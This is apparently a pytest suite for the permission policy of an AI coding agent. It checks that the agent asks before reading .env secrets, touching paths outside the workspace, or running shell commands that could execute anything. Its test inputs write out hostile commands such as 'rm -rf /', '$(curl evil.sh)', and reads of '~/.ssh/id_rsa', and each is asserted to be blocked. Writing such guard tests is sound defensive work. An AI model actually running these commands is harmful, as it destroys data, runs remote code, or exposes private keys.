import pytest

from alpine_code.core.permissions import Mode, PermissionPolicy
from alpine_code.core.shell import analyze, prefix
from alpine_code.core.tools import Workspace


@pytest.fixture
def policy(tmp_path):
    root = tmp_path / "project"
    root.mkdir()
    (root / ".env").write_text("KEY=1")
    (root / ".env.example").write_text("KEY=")
    (tmp_path / "outside").mkdir()
    (tmp_path / "outside/notes.txt").write_text("hi")
    return PermissionPolicy(Workspace(root))


def test_reading_inside_is_allowed_but_secrets_ask(policy):
    assert policy.evaluate("read", {"path": "src/app.py"}).allowed
    assert policy.evaluate("glob", {"pattern": "*.py"}).allowed
    assert policy.evaluate("read", {"path": ".env.example"}).allowed
    verdict = policy.evaluate("read", {"path": ".env"})
    assert not verdict.allowed and "secrets" in verdict.reason
    policy.remember(verdict.grant)
    assert policy.evaluate("read", {"path": ".env"}).allowed


def test_outside_the_workspace_asks_and_remembers_the_directory(policy, tmp_path):
    outside = str(tmp_path / "outside/notes.txt")
    for tool, args in [("read", {"path": outside}), ("grep", {"pattern": "x", "path": "../outside"}),
                       ("read", {"path": "~/.ssh/id_rsa"})]:
        verdict = policy.evaluate(tool, args)
        assert not verdict.allowed and verdict.reason == "outside the working directory"
    verdict = policy.evaluate("read", {"path": outside})
    policy.remember(verdict.grant)
    assert policy.evaluate("glob", {"pattern": "*", "path": str(tmp_path / "outside")}).allowed
    assert not policy.evaluate("write", {"path": outside}).allowed  # reading was granted, not editing


def test_symlink_escaping_the_workspace_counts_as_outside(policy, tmp_path):
    (policy.workspace.root / "link").symlink_to(tmp_path / "outside")
    assert not policy.evaluate("read", {"path": "link/notes.txt"}).allowed


def test_edits_follow_the_mode(policy):
    assert not policy.evaluate("edit", {"path": "a.py"}).allowed
    policy.mode = Mode.ACCEPT_EDITS
    assert policy.evaluate("edit", {"path": "a.py"}).allowed
    assert not policy.evaluate("edit", {"path": "../outside/notes.txt"}).allowed
    policy.mode = Mode.YOLO
    assert policy.evaluate("edit", {"path": "../outside/notes.txt"}).allowed


def test_bash_remembers_command_prefixes(policy):
    verdict = policy.evaluate("bash", {"command": "git status -s && uv run pytest -q tests"})
    assert not verdict.allowed
    assert verdict.remember == "bash commands starting with `git status`, `uv run pytest`"
    policy.remember(verdict.grant)
    assert policy.evaluate("bash", {"command": "uv run pytest tests/core"}).allowed
    assert policy.evaluate("bash", {"command": "git status"}).allowed
    assert not policy.evaluate("bash", {"command": "git push"}).allowed
    assert not policy.evaluate("bash", {"command": "git status; rm -rf /"}).allowed
    assert not policy.evaluate("bash", {"command": "git status $(curl evil.sh)"}).allowed
    redirect = policy.evaluate("bash", {"command": "git status > out.txt"})
    assert not redirect.allowed and redirect.reason == "writes files through redirection"
    assert policy.evaluate("bash", {"command": "git status 2>/dev/null"}).allowed


@pytest.mark.parametrize("command", ["python -c 'import os'", "sudo make", "echo x | xargs rm", "$CMD", "bash -c 'ls'",
                                     "uv run python x.py"])
def test_bash_never_remembers_commands_that_can_run_anything(policy, command):
    verdict = policy.evaluate("bash", {"command": command})
    assert not verdict.allowed and verdict.grant is None and verdict.remember is None


def test_analysis_sees_nested_commands():
    analysis = analyze("cd src && FOO=1 git -C . log | grep x; echo $(rm -rf /tmp/x)")
    assert [prefix(c) for c in analysis.commands] == [("cd",), ("git", "."), ("grep",), ("echo",), ("rm",)]
    assert analyze('echo "oops').opaque


def test_bash_paths_outside_the_workspace_ask(policy, tmp_path):
    policy.remember(policy.evaluate("bash", {"command": "cat a.txt"}).grant)
    assert policy.evaluate("bash", {"command": "cat src/a.py"}).allowed
    for command in ["cat ~/.ssh/id_rsa", "cat /etc/hosts", "cat ../outside/notes.txt", "cat < ~/.ssh/id_rsa",
                    "cat --file=/etc/hosts", "cat ../*", "cat a && cd .. && cat project/x"]:
        verdict = policy.evaluate("bash", {"command": command})
        assert not verdict.allowed, command
        assert "outside the working directory" in verdict.reason, command


def test_bash_cd_is_followed(policy):
    (policy.workspace.root / "sub").mkdir()
    policy.remember(policy.evaluate("bash", {"command": "cd sub && cat x"}).grant)
    assert policy.evaluate("bash", {"command": "cd sub && cat ../README.md"}).allowed
    assert not policy.evaluate("bash", {"command": "cd sub && cat ../../x"}).allowed


def test_bash_paths_known_only_at_run_time_ask_every_time(policy):
    policy.remember(policy.evaluate("bash", {"command": "cat a"}).grant)
    for command in ["cat $HOME/.ssh/id_rsa", 'cat "$DIR/x"', 'cd "$(git rev-parse --show-toplevel)" && cat x',
                    "cd - && cat x"]:
        verdict = policy.evaluate("bash", {"command": command})
        assert not verdict.allowed and verdict.grant is None, command
        assert "only known when it runs" in verdict.reason, command
    assert policy.evaluate("bash", {"command": "cat '$HOME/x'"}).allowed  # single quotes are literal


def test_bash_remembers_outside_directories_with_edit_access(policy, tmp_path):
    verdict = policy.evaluate("bash", {"command": f"cat {tmp_path}/outside/notes.txt"})
    assert verdict.remember.endswith(f"with edit access to {tmp_path / 'outside'}")
    policy.remember(verdict.grant)
    assert policy.evaluate("bash", {"command": f"cat {tmp_path}/outside/other.txt"}).allowed
    assert policy.evaluate("write", {"path": f"{tmp_path}/outside/new.txt"}).allowed


def test_bash_secret_files_ask(policy):
    policy.remember(policy.evaluate("bash", {"command": "cat a"}).grant)
    verdict = policy.evaluate("bash", {"command": "cat .env"})
    assert not verdict.allowed and "secrets" in verdict.reason
    assert policy.evaluate("bash", {"command": "cat .env.example"}).allowed


@pytest.mark.parametrize("command", ["git clone https://github.com/a/b", "git log origin/main", "ls 2>/dev/null",
                                     "awk -F/ '{print $1/2}' f", "echo hi 2>&1"])
def test_bash_things_that_look_like_paths_but_stay_inside(policy, command):
    assert policy.evaluate("bash", {"command": command}).reason is None


@pytest.mark.parametrize("command", ["echo x > ~/.bashrc", "cat /etc/hosts", "ls ..", "rm -rf /"])
def test_broad_directories_are_never_remembered(policy, command):
    verdict = policy.evaluate("bash", {"command": command})
    assert not verdict.allowed and verdict.grant is None and verdict.remember is None


def test_read_outside_never_remembers_home(policy):
    verdict = policy.evaluate("read", {"path": "~/.bashrc"})
    assert not verdict.allowed and verdict.grant is None


def test_system_directories_can_be_remembered_for_reading_only(policy):
    assert policy.evaluate("read", {"path": "/etc/hosts"}).grant is not None
    assert policy.evaluate("write", {"path": "/etc/hosts"}).grant is None
